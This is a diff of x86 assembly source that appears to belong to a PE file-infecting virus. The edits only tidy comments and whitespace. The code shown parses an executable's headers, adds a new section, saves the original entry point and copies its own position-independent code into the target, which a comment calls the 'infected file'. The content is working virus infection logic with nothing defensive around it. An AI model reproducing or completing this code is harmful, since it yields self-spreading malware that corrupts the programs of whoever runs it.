@@ -28,8 +28,6 @@ LOCAL	sectionalignment:DWORD
 LOCAL	pointertorawdata:DWORD
 LOCAL	oldentrypoint:DWORD
 
-; TODO: update BaseOfCode
-
 	pushad
 
 	mov		esi, fileptr				; esi -> IMAGE_DOS_HEADER
@@ -137,7 +135,7 @@ LOCAL	oldentrypoint:DWORD
 	add		ecx, lastsec_sizeofrawdata
 	mov		[esi], ecx					; Wrote PointerToRawData
 	mov		pointertorawdata, ecx
-	
+
 	pop		esi							; esi -> IMAGE_SECTION_HEADER[last + 1]
 	add		esi, 024h					; esi -> IMAGE_SECTION_HEADER[last + 1].Characteristics
 
@@ -185,8 +183,8 @@ LOCAL	oldentrypoint:DWORD
 	add		edi, pointertorawdata
 	push	esi
 	mov		esi, begin_copy
-	add		esi, ebx					; This is to be position independent
-	mov		edx, end_copy - begin_copy	; TODO: This is not ImageBase or position independent
+	add		esi, ebx					; ebx = delta offset. This is to be position independent.
+	mov		edx, end_copy - begin_copy
 	call	my_memcpy
 	pop		esi							; Wrote new section to infected file.
 
